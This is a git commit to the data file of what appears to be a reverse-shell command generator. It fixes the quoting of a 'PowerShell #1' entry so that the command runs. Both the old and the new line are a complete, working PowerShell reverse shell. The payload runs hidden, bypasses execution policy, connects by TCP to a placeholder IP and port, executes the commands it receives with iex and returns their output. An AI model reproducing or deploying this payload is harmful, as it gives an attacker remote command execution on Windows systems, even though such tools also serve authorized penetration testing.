559a3a5cc89347c8d2ceaec69a93987acc312533
watchdog2000 <63520692+watchdog2000@users.noreply.github.com>
2021-07-12 16:16:41 +0100

    Powershell 1 now works
    had to add quotes and some escape chars in to get the command to run within the powershell bed 'powershell -nop... -c ""

--- js/data.js
+++ js/data.js
@@ -166,7 +166,7 @@ const reverseShellCommands = withCommandType(
         },
         {
             "name": "PowerShell #1",
-            "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+            "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command '$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \\"PS \\" + (pwd).Path + \\"> \\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'",
             "meta": ["windows"]
         },
         {
